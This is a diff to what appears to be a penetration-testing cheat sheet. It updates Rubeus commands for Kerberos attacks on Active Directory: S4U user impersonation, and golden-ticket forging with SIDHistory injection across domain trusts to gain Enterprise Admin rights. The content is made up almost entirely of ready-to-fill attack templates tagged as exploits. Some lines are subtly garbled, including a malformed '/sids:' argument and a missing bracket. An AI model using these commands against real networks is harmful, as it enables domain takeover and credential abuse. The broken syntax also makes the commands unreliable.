@@ -251,10 +251,10 @@ DB admin: MSSQLSvc
 .\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /altservice:<service_comma_sep> /domain:<domain> /ptt
 ```
 
-## golden - child-parent trust SIDHistory injection 
+## golden - child-parent trust sidHistory injection 
 #cat/ATTACK/EXPLOIT 
 ```
-.\Rubeus.exe golden /user:<username> /id:<user RID> /domain:<child_domain_FQDN> /sid:child_somain_sid> /groups:<RIDs|513> /sids:<root_domain_sid>-<rid|519> /aes256:<krbtgt_aes_key> /ptt
+.\Rubeus.exe golden /user:<username> /id:<user RID> /domain:<src_domain_fqdn> /sid:child_somain_sid> /groups:<RIDs|513> /sids:<dst_domain_sid>-<rid|519> /aes256:<krbtgt_aes_key> /ptt
 ```
 
 ## silver - to do
@@ -326,10 +326,10 @@ HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights)
 ```
 
 
-## Rubeus - sIDHistory injection
+## Rubeus - sidHistory injection
 #cat/ATTACK/EXPLOIT 
 ```powershell
-.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<sid_ets_admin> /user:<name> /ptt
+.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<src_domain_fqdn> /sid:<src_domain_sid> /sids:</sids:<dst_domain_sid>-<rid|519> /user:<name> /id:<user_rid> /ptt
 ```
 
 ## Misc - get ntlm hash from password
